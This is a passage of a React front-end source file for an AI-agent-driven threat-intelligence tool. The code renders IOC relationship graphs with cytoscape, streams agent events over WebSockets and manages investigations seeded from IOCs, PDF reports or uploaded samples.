            'shadow-color': '#fbbf24',
            'shadow-opacity': 0.55,
          },
        },
        {
          selector: 'node[?suspicious]',
          style: { 'border-color': '#f85149', 'border-width': 3 }
        },
        {
          selector: 'node[?phishing]',
          style: { 'border-color': '#f85149', 'border-width': 3 }
        },
        {
          selector: 'node[?cdn]',
          style: { 'border-color': '#1f6feb', 'border-width': 3, 'border-style': 'dashed' }
        },
        {
          selector: 'node[?parking]',
          style: { 'border-color': '#8b949e', 'border-style': 'dashed', 'opacity': 0.6 }
        },
        {
          selector: 'node[?sinkhole]',
          style: { 'border-color': '#f85149', 'border-style': 'dashed', 'opacity': 0.5 }
        },
        {
          selector: 'node[type="report"]',
          style: {
            'width': 34, 'height': 34,
            'shape': 'concave-hexagon',
            'background-color': '#f5a623',
            'border-color': '#d48806',
            'border-width': 2,
            'color': '#e6edf3',
            'font-weight': 'bold',
            'font-size': 10,
          }
        },
        {
          selector: 'node[type="report"][value="investigation_summary"]',
          style: {
            'shape': 'star',
            'width': 46, 'height': 46,
            'background-color': '#f0a500',
            'border-color': '#c87800',
            'border-width': 3,
            'font-size': 11,
            'font-weight': 'bold',
          }
        },
        {
          selector: 'node.search-match',
          style: {
            'border-color': '#58a6ff',
            'border-width': 4,
            'shadow-blur': 14,
            'shadow-color': '#58a6ffbb',
            'shadow-opacity': 0.9,
          }
        },
        {
          selector: 'node.search-dim',
          style: { 'opacity': 0.25 }
        },
        {
          selector: 'node:selected',
          style: {
            'border-color': '#ffffff',
            'border-width': 4,
            'shadow-blur': 18,
            'shadow-color': '#ffffff55',
            'shadow-offset-x': 0,
            'shadow-offset-y': 0,
            'shadow-opacity': 0.8
          }
        },
        {
          selector: 'node.picked',
          style: {
            'border-color': '#58a6ff',
            'border-width': 4,
            'shadow-blur': 14,
            'shadow-color': '#58a6ffaa',
            'shadow-opacity': 0.9,
          }
        },
        {
          selector: 'edge',
          style: {
            'width': 1.5,
            'line-color': '#30363d',
            'target-arrow-color': '#30363d',
            'target-arrow-shape': 'triangle',
            'curve-style': 'bezier',
            'label': ele => showEdgeLabelsRef.current ? (ele.data('relation') || '') : '',
            'font-size': 8,
            'color': '#8b949e',
            'text-rotation': 'autorotate',
            'text-background-color': '#0d1117',
            'text-background-opacity': 1,
            'text-background-padding': 2,
            // Per-relation visibility toggle (Quentin's request: hide
            // historical / co_resolves links to declutter dense graphs).
            'display': ele => filterRelationsRef.current.has(ele.data('relation')) ? 'none' : 'element',
          }
        },
        {
          selector: 'edge[relation="resolves_to"]',
          style: { 'line-color': '#58a6ff66', 'target-arrow-color': '#58a6ff66' }
        },
        {
          selector: 'edge[relation="co_resolves"]',
          style: { 'line-color': '#ffa65766', 'target-arrow-color': '#ffa65766' }
        },
        {
          selector: 'edge[relation="has_subdomain"]',
          style: { 'line-color': '#58a6ff44', 'target-arrow-color': '#58a6ff44', 'line-style': 'dashed' }
        },
        {
          selector: 'edge[relation="known_ioc"]',
          style: { 'line-color': '#f8514988', 'target-arrow-color': '#f8514988', 'width': 2 }
        },
        {
          selector: 'edge[relation="same_ns_set"]',
          style: { 'line-color': '#56d36466', 'target-arrow-color': '#56d36466', 'width': 2 }
        },
      ],
      layout: {
        name: 'cose-bilkent',
        animate: false,
        nodeRepulsion: 12000,
        idealEdgeLength: 140,
        edgeElasticity: 0.45,
        gravity: 0.15,
        gravityRangeCompound: 1.2,
        nestingFactor: 0.1,
        numIter: 2500,
        tile: true,
        randomize: true,
        nodeDimensionsIncludeLabels: true,
      }
    })

    cyRef.current.on('tap', 'node', evt => {
      const d = evt.target.data()
      const oe = evt.originalEvent
      const multiKey = oe && (oe.ctrlKey || oe.metaKey || oe.shiftKey)
      if (multiKey) {
        // Multi-select toggle: don't change the details panel.
        setPickedIds(prev => {
          const next = new Set(prev)
          if (next.has(d.id)) next.delete(d.id); else next.add(d.id)
          return next
        })
        return
      }
      setSelected(d)
      setEvidenceData(null)
      if (d.type === 'report') {
        setReport(d.metadata)
        setRightTab('report')
      } else {
        setRightTab('node')
      }
      // On phones, surface the details drawer automatically — otherwise the
      // selection is invisible behind the off-canvas right panel.
      if (window.matchMedia && window.matchMedia('(max-width: 768px)').matches) {
        setMobileRightOpen(true)
      }
    })
    cyRef.current.on('tap', evt => {
      if (evt.target === cyRef.current) {
        setSelected(null)
        // Clicking empty canvas also clears the multi-selection.
        setPickedIds(prev => (prev.size === 0 ? prev : new Set()))
      }
    })

    refreshInvs().then(() => {
      // Honor a ?inv=<id> query param. Two cases:
      //   (a) hard reload while viewing an investigation → restore that one
      //   (b) link from a shared graph clone → land directly on it
      // We DO NOT strip the param afterwards: the URL is the canonical state
      // for "which investigation is open". Subsequent openInv() calls update
      // it via the activeInv→URL sync useEffect below, so back/forward and
      // browser refresh both behave correctly.
      try {
        const sp = new URLSearchParams(window.location.search)
        const wanted = sp.get('inv')
        if (wanted) openInv(wanted)
      } catch (_) { /* ignore */ }
    })
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // Update edge label visibility reactively
  useEffect(() => {
    if (!cyRef.current) return
    cyRef.current.style()
      .selector('edge')
      .style('label', ele => showEdgeLabels ? (ele.data('relation') || '') : '')
      .update()
  }, [showEdgeLabels])

  // Refresh cytoscape rendering when pin/note toggles or edge-relation
  // filter changes — the style functions read from refs, so we just need
  // to nudge cy to re-evaluate them.
  useEffect(() => {
    if (!cyRef.current) return
    cyRef.current.style().update()
  }, [showPins, showNotes, filterRelations])

  // Sync the `picked` CSS class on nodes whenever the selection set changes.
  useEffect(() => {
    const cy = cyRef.current
    if (!cy) return
    cy.nodes().forEach(n => n.toggleClass('picked', pickedIds.has(n.id())))
  }, [pickedIds])

  // Keep a reactive node count so toolbar labels (e.g. "all (N)") update live.
  useEffect(() => {
    const cy = cyRef.current
    if (!cy) return
    const update = () => setNodeCount(cy.nodes().length)
    cy.on('add remove', 'node', update)
    update()
    return () => cy.off('add remove', 'node', update)
  }, [])

  // Poll the Claude-subscription quota state. We poll faster while the
  // banner is up (so the countdown stays accurate and we can flip from
  // "wait" → "ready to resume" without the user reloading) and slower
  // when everything is fine. The local tick state forces a re-render
  // every second so the displayed countdown ticks down smoothly.
  useEffect(() => {
    let cancelled = false
    const fetchQuota = async () => {
      try {
        const r = await fetch('/api/quota', { credentials: 'same-origin' })
        if (!r.ok || cancelled) return
        const s = await r.json()
        setQuotaState(s || { exhausted: false, exhausted_until: null, message: null })
      } catch (_) { /* swallow */ }
    }
    fetchQuota()
    const id = setInterval(fetchQuota, 30_000)
    return () => { cancelled = true; clearInterval(id) }
  }, [])

  useEffect(() => {
    if (!quotaState.exhausted) return
    const id = setInterval(() => setQuotaTick(t => (t + 1) & 0xffff), 1000)
    return () => clearInterval(id)
  }, [quotaState.exhausted])

  // Reconnect loop on server shutdown (fires once `serverDown` turns true).
  // Poll /api/auth/me every 2s; when the backend answers OK, reload the page
  // so every side-effect (WS, timers, fetches) gets a clean slate.
  useEffect(() => {
    if (!serverDown) return
    let cancelled = false
    const tick = async () => {
      if (cancelled) return
      try {
        const r = await fetch('/api/auth/me', { credentials: 'same-origin' })
        if (r.ok) { window.location.reload(); return }
      } catch (_) {}
      setTimeout(tick, 2000)
    }
    // Give the service ~3s to finish its shutdown before the first probe.
    const t = setTimeout(tick, 3000)
    return () => { cancelled = true; clearTimeout(t) }
  }, [serverDown])

  // ── focusNode ────────────────────────────────────────────────────────────
  const focusNode = useCallback((id) => {
    const cy = cyRef.current
    if (!cy) return
    const node = cy.$id(id)
    if (!node.length) return
    node.select()
    cy.animate({ fit: { eles: node.closedNeighborhood(), padding: 80 }, duration: 400 })
    setSelected(node.data())
    setRightTab('node')
  }, [])

  // ── applyFilters ─────────────────────────────────────────────────────────
  const applyFilters = useCallback((ft) => {
    const cy = cyRef.current
    if (!cy) return
    cy.nodes().forEach(n => {
      n.style('display', ft.has(n.data('type')) ? 'none' : 'element')
    })
    cy.edges().forEach(e => {
      const srcHidden = ft.has(e.source().data('type'))
      const tgtHidden = ft.has(e.target().data('type'))
      e.style('display', (srcHidden || tgtHidden) ? 'none' : 'element')
    })
  }, [])

  const toggleFilterType = (type) => {
    setFilterTypes(prev => {
      const next = new Set(prev)
      if (next.has(type)) next.delete(type); else next.add(type)
      applyFilters(next)
      return next
    })
  }

  // ── Graph helpers ────────────────────────────────────────────────────────
  const relayoutTimer = useRef(null)
  const relayout = useCallback(() => {
    const cy = cyRef.current
    if (!cy || cy.nodes().length === 0) return
    // Debounce: if many nodes are streaming in, do not run layout for every one
    if (relayoutTimer.current) clearTimeout(relayoutTimer.current)
    relayoutTimer.current = setTimeout(() => {
      cy.layout({
        name: 'cose-bilkent',
        animate: true,
        animationDuration: 500,
        randomize: false,
        nodeRepulsion: 12000,
        idealEdgeLength: 140,
        edgeElasticity: 0.45,
        gravity: 0.15,
        gravityRangeCompound: 1.2,
        nestingFactor: 0.1,
        numIter: 2500,
        tile: true,
        nodeDimensionsIncludeLabels: true,
      }).run()
    }, 250)
  }, [])

  // Hard relayout (used by toolbar): always randomize so a stuck "line" graph
  // breaks out of its bad local minimum.
  const hardRelayout = useCallback(() => {
    const cy = cyRef.current
    if (!cy || cy.nodes().length === 0) return
    if (relayoutTimer.current) clearTimeout(relayoutTimer.current)
    cy.layout({
      name: 'cose-bilkent',
      animate: true,
      animationDuration: 600,
      randomize: true,
      nodeRepulsion: 14000,
      idealEdgeLength: 160,
      edgeElasticity: 0.45,
      gravity: 0.1,
      numIter: 4000,
      tile: true,
      nodeDimensionsIncludeLabels: true,
    }).run()
  }, [])

  // The agent emits two flavours of internal "report" node that aren't
  // meant for the graph canvas: working_hypothesis (phase-1.5 category
  // commit) and budget_extension_<N> (R4 audit log). Both have useful
  // metadata, but rendering them as separate graph nodes clutters the
  // layout — they belong in the Report side-panel.
  const isAuxReportNode = (n) => {
    if (!n || n.type !== 'report') return false
    const v = String(n.value || '').toLowerCase()
    return v === 'working_hypothesis' || v.startsWith('working_hypothesis')
        || v.startsWith('budget_extension')
        || v === 'lessons_learned'
  }

  const addCyNode = useCallback((n) => {
    if (isAuxReportNode(n)) return
    const cy = cyRef.current
    // For hash nodes, prefer a human-readable filename for the label;
    // a raw sha256 truncated to 28 chars is useless. Fall back to a short
    // hash prefix when no filename is available.
    const displayValue = (() => {
      if (n.type === 'hash') {
        const md = n.metadata || {}
        const name = md.file_name
          || (Array.isArray(md.names) && md.names[0])
          || (Array.isArray(md.file_names) && md.file_names[0])
          || md.meaningful_name
        if (name) return String(name)
        return n.value.slice(0, 10) + '…'
      }
      if (n.type === 'command_line') {
        // value is a 16-char sha256 prefix — useless as a label. Prefer
        // metadata.preview (first line up to 80 chars) so the analyst sees
        // what the snippet actually starts with on the graph.
        const md = n.metadata || {}
        const p = md.preview || md.file_name
        if (p) return String(p)
        return n.value.slice(0, 10) + '…'
      }
      return n.value
    })()
    const label = n.type === 'report' && n.value === 'investigation_summary'
      ? 'Investigation Summary'
      : (displayValue.length > 30 ? displayValue.slice(0, 28) + '…' : displayValue)
    const d = {
      id: n.id, type: n.type, label, value: n.value,
      metadata: n.metadata, tags: n.tags, source: n.source, confidence: n.confidence,
      created_at: n.created_at
    }
    // Boolean flags driven by tag presence — each MUST be set explicitly
    // (true OR false) on every update, otherwise an "unpin" or "untag"
    // leaves the previous true value lingering in cytoscape's data merge.
    const FLAG_TAGS = ['pinned', 'suspicious', 'phishing', 'cdn', 'parking', 'sinkhole', 'seed']
    const tagSet = new Set(n.tags || [])
    FLAG_TAGS.forEach(t => { d[t] = tagSet.has(t) })
    if (cy.$id(n.id).length) {
      cy.$id(n.id).data(d)
    } else {
      cy.add({ group: 'nodes', data: d })
    }
    setNodeValues(prev => new Map([...prev, [n.value, n.id]]))
    setExistingTypes(prev => new Set([...prev, n.type]))
  }, [])

  const addCyEdge = useCallback((e) => {
    const cy = cyRef.current
    if (cy.$id(e.id).length) return
    if (!cy.$id(e.src).length || !cy.$id(e.dst).length) return
    cy.add({ group: 'edges', data: { id: e.id, source: e.src, target: e.dst, relation: e.relation, evidence: e.evidence } })
    if (e.relation) {
      setExistingRelations(prev => {
        if (prev.has(e.relation)) return prev
        const next = new Set(prev); next.add(e.relation); return next
      })
    }
  }, [])

  // Pull aux-report nodes (working_hypothesis, budget_extension_<N>) out of
  // a snapshot or single event and stash them in side-panel state so they
  // never reach cytoscape but stay accessible to the analyst.
  const captureAuxReport = (n) => {
    if (!n || n.type !== 'report') return
    const v = String(n.value || '').toLowerCase()
    if (v === 'working_hypothesis' || v.startsWith('working_hypothesis')) {
      if (n.metadata) {
        setHypothesis({ ...n.metadata, _ts: n.created_at })
        const cy = cyRef.current
        const liveCount = cy ? cy.nodes().length : 0
        setHypothesisStamp({ ts: n.created_at, nodeCountAt: liveCount })
      }
    } else if (v.startsWith('budget_extension')) {
      const m = String(n.value || '').match(/budget_extension[_-]?(\d+)/i)
      const round = m ? Number(m[1]) : null
      setBudgetLog(prev => {
        // Dedup by value; keep newest metadata for the same round.
        const others = prev.filter(b => b.value !== n.value)
        return [...others, { value: n.value, round, ts: n.created_at, metadata: n.metadata || {} }]
          .sort((a, b) => (a.round ?? 0) - (b.round ?? 0))
      })
    }
  }

  const handleEvent = useCallback((evt) => {
    if (evt.kind === 'snapshot') {
      evt.graph.nodes.forEach(n => addCyNode(n))
      evt.graph.nodes.forEach(captureAuxReport)
      evt.graph.edges.forEach(e => addCyEdge(e))
      // Auto-load report if present in snapshot
      const reportNode = evt.graph.nodes.find(n => n.type === 'report' && n.value === 'investigation_summary')
      if (reportNode?.metadata) setReport(reportNode.metadata)
      relayout()
    } else if (evt.kind === 'node_added' || evt.kind === 'node_updated') {
      addCyNode(evt.node)
      captureAuxReport(evt.node)
      // Auto-refresh report when the report node is updated (e.g. after custom prompt)
      if (evt.node.type === 'report' && evt.node.value === 'investigation_summary' && evt.node.metadata) {
        setReport(evt.node.metadata)
      }
      relayout()
    } else if (evt.kind === 'edge_added') {
      addCyEdge(evt.edge)
      relayout()
    } else if (evt.kind === 'node_tagged') {
      const n = cyRef.current.$id(evt.node_id)
      if (n.length) n.data(evt.tag, true)
    }
  }, [addCyNode, addCyEdge, relayout])

  // ── refreshInvs ──────────────────────────────────────────────────────────
  const refreshInvs = async () => {
    const r = await fetch('/api/investigations')
    const data = await r.json()
    setInvs(data)
    return data
  }

  // ── openInv ───────────────────────────────────────────────────────────────
  const openInv = useCallback((id) => {
    Object.values(wsMap).forEach(ws => ws.close())
    Object.keys(wsMap).forEach(k => delete wsMap[k])
    setActiveInv(id)
    setSelected(null)
    setReport(null)
    setHypothesis(null)
    setBudgetLog([])
    setEvents([])
    setAgentNotes([])
    setExpandedReasoning(new Set())
    // Backfill the timeline from the persisted transcript so reasoning +
    // tool calls survive a page reload. Live WS events appended on top.
    fetch(`/api/investigations/${id}/transcript`, { credentials: 'same-origin' })
      .then(r => r.ok ? r.json() : null)
      .then(j => {
        if (!j || activeInvRef.current !== id) return
        const notes = []
        for (const e of (j.entries || [])) {
          if (e.kind === 'reasoning' && e.text) {
            notes.push({ ts: e.ts, noteKind: 'reasoning', text: e.text })
          } else if (e.kind === 'tool') {
            notes.push({
              ts: e.ts, noteKind: 'tool', text: e.name,
              detail: JSON.stringify(e.input || {}).slice(0, 200),
            })
          } else if (e.kind === 'tool_result' && e.is_error) {
            notes.push({
              ts: e.ts, noteKind: 'reasoning',
              text: `⚠ ${e.name} returned an error: ${(e.result_preview || '').slice(0, 200)}`,
            })
          }
        }
        if (notes.length) setAgentNotes(notes)
      })
      .catch(() => {})
    setNodeValues(new Map())
    setExistingTypes(new Set())
    setFilterTypes(new Set())
    setFilterRelations(new Set())
    setExistingRelations(new Set())
    setPickedIds(new Set())
    cyRef.current.elements().remove()
    // Mobile: collapse the sidebar so the freshly opened graph is visible.
    if (window.matchMedia && window.matchMedia('(max-width: 768px)').matches) {
      setMobileLeftOpen(false)
    }

    const wsProto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ws = new WebSocket(`${wsProto}//${location.host}/ws/${id}`)
    wsMap[id] = ws
    // Per-investigation modification dedupe: nodes get re-broadcast many
    // times during enrichment (sources merge, metadata grows). We coalesce
    // updates of the same node within a 5s window to a single timeline note.
    const lastModTs = new Map()
    ws.onmessage = (m) => {
      const evt = JSON.parse(m.data)
      if (evt.kind === 'server_shutdown') {
        setServerDown(true)
        setEvents(e => [`⚠ ${evt.message || 'Service is restarting…'}`, ...e])
        return
      }
      handleEvent(evt)
      // ── Collect agent notes for the investigation timeline ──
      const evtTs = evt._ts || (Date.now() / 1000)
      if (evt.kind === 'agent_assistant') {
        const content = (evt.msg || evt.data || {})?.message?.content || []
        const textBlocks = content.filter(b => b.type === 'text').map(b => b.text).filter(Boolean)
        const toolBlocks = content.filter(b => b.type === 'tool_use')
        const notes = []
        if (textBlocks.length) {
          // Agent reasoning — keep the full text (up to a 4000-char cap to
          // bound a single runaway message). The timeline UI line-clamps
          // for compactness and expands on click.
          const full = textBlocks.join(' ').trim()
          if (full.length > 5) notes.push({ ts: evtTs, noteKind: 'reasoning', text: full.slice(0, 4000) })
        }
        for (const t of toolBlocks) {
          notes.push({ ts: evtTs, noteKind: 'tool', text: t.name, detail: JSON.stringify(t.input || {}).slice(0, 120) })
        }
        if (notes.length) setAgentNotes(prev => [...prev, ...notes])
      }
      // ── Track node/report modifications (skip the initial node_added so
      //    we don't double-log creation; the cy.nodes() pass already gives
      //    the timeline a creation entry via created_at). ──
      if (evt.kind === 'node_updated' && evt.node) {
        const nodeId = evt.node.id
        const prevTs = lastModTs.get(nodeId) || 0
        const isReport =
          evt.node.type === 'report' && evt.node.value === 'investigation_summary'
        // Always emit report updates (rare + meaningful). Coalesce other node
        // updates inside 5 seconds — enrichment churn becomes one entry.
        if (isReport || evtTs - prevTs > 5) {
          lastModTs.set(nodeId, evtTs)
          setAgentNotes(prev => [...prev, {
            ts: evtTs,
            noteKind: isReport ? 'report_updated' : 'node_updated',
            text: isReport
              ? 'Investigation report updated'
              : iocString(evt.node.value),
            nodeType: evt.node.type,
            nodeId,
          }])
        }
      }
      if (evt.kind === 'node_tagged') {
        const n = cyRef.current?.$id(evt.node_id)
        const nodeData = n && n.length ? n.data() : {}
        setAgentNotes(prev => [...prev, {
          ts: evtTs,
          noteKind: 'node_tagged',
          text: `${iocString(nodeData.value || evt.node_id)} → ${evt.tag}`,
          nodeType: nodeData.type,
          nodeId: evt.node_id,
        }])
      }
      const label = (() => {
        if (!evt.kind.startsWith('agent_') && !['snapshot','node_added','node_updated','edge_added','node_tagged'].includes(evt.kind)) {
          return evt.kind
        }
        const msg = evt.msg || evt.data || {}
        if (evt.kind === 'agent_starting') {
          refreshInvs()
          return '▶ agent starting'
        }
        if (evt.kind === 'status_change') {
          refreshInvs()
          if (evt.status === 'quota_exceeded' && evt.quota_reset_at) {
            // Skip the poll — show the banner instantly with the reset epoch
            // we just received over the websocket.
            setQuotaState({
              exhausted: true,
              exhausted_until: evt.quota_reset_at,
              message: evt.quota_message || 'Claude subscription quota reached',
            })
          }
          return `● status: ${evt.status || '?'}`
        }
        if (evt.kind === 'agent_exit') {
          const rc = msg.rc ?? msg?.msg?.rc ?? '?'
          const phase = msg.phase ?? msg?.msg?.phase ?? ''
          refreshInvs()
          if (phase === 'custom_prompt') {
            setRightTab('chat')
            // Fallback: clear pending state in case prompt_history wasn't updated
            setPendingPrompt(null)
            setPromptBusy(false)
          }
          return phase === 'custom_prompt'
            ? `✓ prompt done`
            : `■ exit rc=${rc}`
        }
        if (evt.kind === 'agent_stderr') return `⚠ ${(msg.msg || msg || '').toString().slice(0, 80)}`
        if (evt.kind === 'agent_rate_limit_event') return '__ratelimit__'
        if (evt.kind === 'agent_assistant') {
          const content = msg?.message?.content || []
          const tool = content.find(b => b.type === 'tool_use')
          if (tool) return `__tool__${tool.name}(${JSON.stringify(tool.input || {}).slice(0, 60)})`
        }
        return null
      })()
      if (label) setEvents(e => [label, ...e].slice(0, 150))
    }
    ws.onerror = () => setEvents(e => ['__error__⚠ WS error', ...e])
  }, [handleEvent])

  // Parse the seed textarea into a deduped list of refanged IOCs (the
  // "list" can be one entry — that's the single-IOC case). One IOC per
  // line OR comma-separated. Whitespace-only lines dropped.
  const parseSeedInput = (raw) => {
    const seen = new Set()
    const out = []
    for (const piece of (raw || '').split(/[\n,]+/)) {
      const v = refang(piece).trim()
      if (!v || seen.has(v)) continue
      seen.add(v)
      out.push(v)
    }
    return out
  }

  // ── start ─────────────────────────────────────────────────────────────────
  // Unified entrypoint: 0 IOCs → no-op, 1 IOC → /api/investigations, 2+ → batch.
  // The combined toggle still gates batch graph topology (one graph vs many).
  const start = async () => {
    const values = parseSeedInput(seedText)
    if (values.length === 0) return
    if (values.length === 1) {
      const cleaned = values[0]
      const r = await fetch('/api/investigations', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seed_type: detectIOCType(cleaned, vertical), seed_value: cleaned, model, effort, vertical })
      })
      const { id } = await r.json()
      await refreshInvs()
      openInv(id)
      setSeedText('')
      return
    }
    const items = values.map(v => ({ seed_type: detectIOCType(v, vertical), seed_value: v }))
    const r = await fetch('/api/investigations/batch', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ items, model, effort, combined: batchCombined, vertical })
    })
    const d = await r.json()
    await refreshInvs()
    const first = (d.started || [])[0]
    if (first) openInv(first.id)
    setSeedText('')
  }

  // ── PDF import ────────────────────────────────────────────────────────────
  // Bootstrap a graph from a CTI report PDF: server-side regex extracts every
  // plausible IOC, and the agent reads the report text as context so the
  // graph reflects the report's narrative (actors, stated relationships).
  const startFromPdf = async () => {
    if (!pdfFile) return
    setPdfBusy(true); setPdfError('')
    try {
      const fd = new FormData()
      fd.append('file', pdfFile)
      fd.append('model', model)
      if (effort) fd.append('effort', effort)
      const r = await fetch('/api/investigations/from_pdf', {
        method: 'POST', body: fd, credentials: 'same-origin'
      })
      if (!r.ok) {
        const t = await r.text(); throw new Error(t || `HTTP ${r.status}`)
      }
      const d = await r.json()
      await refreshInvs()
      openInv(d.id)
      setPdfFile(null)
      if (pdfFileInputRef.current) pdfFileInputRef.current.value = ''
      setEvents(e => [`▶ PDF "${d.filename}": ${d.extracted_iocs.length} IOC(s) extraits, ${d.seeds_queued} en file`, ...e])
    } catch (e) {
      setPdfError(String(e.message || e).slice(0, 200))
    } finally {
      setPdfBusy(false)
    }
  }

  // ── Sample / command-line import ───────────────────────────────────────
  // Bootstrap an investigation from either an uploaded sample (binary or
  // script — its sha256 becomes the seed) or a pasted command line / script
  // (extracted IOCs become the seeds, the raw text becomes a command_line
  // context node + report_context for the agent).
  const startFromSample = async () => {
    const text = sampleText.trim()
    if (!sampleFile && !text) return
    setSampleBusy(true); setSampleError('')
    try {
      const fd = new FormData()
      if (sampleFile) fd.append('file', sampleFile)
      if (text)       fd.append('text', text)
      fd.append('model', model)
      if (effort) fd.append('effort', effort)
      const r = await fetch('/api/investigations/from_sample', {
        method: 'POST', body: fd, credentials: 'same-origin'
      })
      if (!r.ok) {
        const t = await r.text(); throw new Error(t || `HTTP ${r.status}`)
      }
      const d = await r.json()
      await refreshInvs()
      openInv(d.id)
      setSampleFile(null)
      setSampleText('')
      if (sampleFileInputRef.current) sampleFileInputRef.current.value = ''
      const what = d.filename
        ? `sample "${d.filename}" (${d.file_type})`
        : 'pasted command'
      setEvents(e => [`▶ ${what}: ${d.seeds_queued} seed(s) queued`, ...e])
    } catch (e) {
      setSampleError(String(e.message || e).slice(0, 200))
    } finally {
      setSampleBusy(false)
    }
  }

  // Append IOCs extracted from a PDF onto the currently open investigation.
  const addPdfToActiveInv = async (file) => {
    if (!file || !activeInv) return
    setPdfBusy(true); setPdfError('')
    try {
      const fd = new FormData()
      fd.append('file', file)
      fd.append('model', model)
      if (effort) fd.append('effort', effort)
      const r = await fetch(`/api/investigations/${activeInv}/from_pdf`, {
        method: 'POST', body: fd, credentials: 'same-origin'
      })
      if (!r.ok) {
        const t = await r.text(); throw new Error(t || `HTTP ${r.status}`)
      }
      const d = await r.json()
      setEvents(e => [`▶ PDF "${d.filename}" → +${d.seeds_queued} seed(s)`, ...e])
      if (pdfAddSeedInputRef.current) pdfAddSeedInputRef.current.value = ''
    } catch (e) {
      setPdfError(String(e.message || e).slice(0, 200))
    } finally {
      setPdfBusy(false)
    }
  }

  // ── deleteInv / rerunInv ──────────────────────────────────────────────────
  const deleteInv = async (id, ev) => {
    ev.stopPropagation()
    if (!confirm('Delete this investigation?')) return
    await fetch(`/api/investigations/${id}`, { method: 'DELETE' })
    if (activeInvRef.current === id) {
      cyRef.current.elements().remove()
      setActiveInv(null)
      setSelected(null)
      setReport(null)
      setHypothesis(null)
      setHypothesisStamp(null)
      setBudgetLog([])
      setEvents([])
      setNodeValues(new Map())
      setExistingTypes(new Set())
    }
    await refreshInvs()
  }

  // Rename: prompt for a new title and PATCH it. Empty / cancelled = clear,
  // which falls back to the seed value in the sidebar display.
  const renameInv = async (id, currentTitle, currentSeed, ev) => {
    if (ev) ev.stopPropagation()
    const next = window.prompt(
      'Rename this investigation (blank to reset to the seed value):',
      currentTitle || ''
    )
    if (next === null) return  // user cancelled
    const r = await fetch(`/api/investigations/${id}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: next })
    })
    if (!r.ok) {
      const t = await r.text(); alert(`Rename failed: ${t || r.status}`); return
    }
    await refreshInvs()
  }

  const stopInv = async (id, ev) => {
    ev.stopPropagation()
    if (!confirm('Stop this investigation? The agent will be killed mid-run; partial graph + events are kept.')) return
    await fetch(`/api/investigations/${id}/stop`, { method: 'POST' })
    await refreshInvs()
  }

  const rerunInv = async (id, ev) => {
    ev.stopPropagation()
    if (!confirm('Rerun this investigation? The existing graph is preserved; the agent will pivot from current state with a fresh budget.')) return
    await fetch(`/api/investigations/${id}/rerun`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ model, effort }) })
    await refreshInvs()
    openInv(id)
  }

  // Resume an investigation that was halted by a Claude-subscription quota
  // error. Backend rejects (HTTP 425) if we're still inside the cooldown
  // window; surface the wait time in that case so the analyst doesn't think
  // the click did nothing.
  const resumeInv = async (id, ev) => {
    if (ev) ev.stopPropagation()
    const r = await fetch(`/api/investigations/${id}/resume`, { method: 'POST' })
    if (r.status === 425) {
      let detail = null
      try { detail = (await r.json()).detail } catch (_) {}
      const wait = detail?.retry_after_seconds
      alert(`Claude subscription still in cooldown. Try again in ${wait ? formatCountdown(Date.now()/1000 + wait) : 'a moment'}.`)
      return
    }
    if (!r.ok) {
      const t = await r.text(); alert(`Resume failed: ${t || r.status}`); return
    }
    // Clear the global banner immediately so the UI reflects the resume —
    // /api/quota will reconfirm on the next poll.
    setQuotaState({ exhausted: false, exhausted_until: null, message: null })
    await refreshInvs()
    openInv(id)
  }

  // Merge investigation `srcId` into `dstId`. Backend dedups nodes on
  // (type, value) and edges on (src, dst, relation), unioning metadata /
  // tags / sources_seen. The destination's existing report is preserved.
  const mergeInv = async (srcId, dstId, deleteSource) => {
    const r = await fetch(`/api/investigations/${encodeURIComponent(srcId)}/merge_into/${encodeURIComponent(dstId)}`, {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ delete_source: !!deleteSource }),
      credentials: 'same-origin',
    })
    if (!r.ok) {
      const t = await r.text()
      alert(`Merge failed: ${t || r.status}`)
      return
    }
    const d = await r.json()
    setMergePickerSrc(null)
    await refreshInvs()
    openInv(dstId)
    setEvents(e => [
      `▶ Merge OK — +${d.nodes_added} new, ${d.nodes_merged} deduped, ${d.edges_added} edge(s)${d.source_deleted ? ', source deleted' : ''}.`,
      ...e,
    ])
  }

  // Attach a new PEER seed to the currently open investigation. The agent runs
  // the full single-seed workflow for the new IOC on the existing graph and
  // updates the report with per-seed summaries + cross-seed findings.
  const submitAddSeed = async () => {
    if (!activeInv) return
    const v = refang(addSeedValue)
    if (!v) return
    // Detect under the active investigation's vertical so a bare handle added
    // to an OSINT investigation seeds as a username, not a domain.
    const activeVertical = invs.find(i => i.id === activeInv)?.vertical || 'cti'
    const effectiveType = detectIOCType(v, activeVertical)
    await fetch(`/api/investigations/${activeInv}/add_seed`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed_type: effectiveType, seed_value: v, model, effort })
    })
    setEvents(e => [`▶ add seed: ${effectiveType} ${v}`, ...e])
    setAddSeedValue('')
    refreshInvs()
  }

  // ── copy helpers ─────────────────────────────────────────────────────────
  const copyNodeJson = (n) => {
    navigator.clipboard.writeText(JSON.stringify({
      type: n.type, value: n.value, tags: n.tags,
      source: n.source, confidence: n.confidence, metadata: n.metadata
    }, null, 2))
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  // Return the cytoscape node collection to export / copy:
  //   - if the user has explicitly picked nodes (ctrl+click), use exactly those;
  //   - otherwise, use every node currently on the graph (implicit select-all).
  const getTargetNodes = () => {
    const cy = cyRef.current
    if (!cy) return null
    return pickedIds.size > 0
      ? cy.nodes().filter(n => pickedIds.has(n.id()))
      : cy.nodes()
  }

  const copyGraphJson = () => {
    const targets = getTargetNodes()
    if (!targets || targets.length === 0) return
    const idSet = new Set(); targets.forEach(n => idSet.add(n.id()))
    const cy = cyRef.current
    const nodes = targets.map(n => {
      const d = n.data()
      return {
        id: d.id, type: d.type, value: d.value,
        tags: d.tags || [], source: d.source, confidence: d.confidence,
        metadata: d.metadata || {},
      }
    })
    // Only include edges that connect two nodes in the selection.
    const edges = cy.edges()
      .filter(e => idSet.has(e.source().id()) && idSet.has(e.target().id()))
      .map(e => ({
        id: e.id(), src: e.source().id(), dst: e.target().id(),
